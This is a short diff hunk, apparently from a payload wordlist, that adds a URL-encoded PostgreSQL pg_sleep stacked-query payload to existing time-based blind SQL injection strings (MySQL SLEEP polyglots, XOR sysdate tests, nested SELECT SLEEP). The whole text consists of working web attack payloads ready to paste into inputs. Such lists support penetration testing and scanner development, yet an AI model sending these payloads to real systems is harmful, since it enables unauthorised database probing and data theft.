@@ -95,3 +95,4 @@ SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
 0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
 0"XOR(if(now()=sysdate(),sleep(20),0))XOR”Z 
 (SELECT * FROM (SELECT(SLEEP(20)))cfm)%2D%2D
+'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
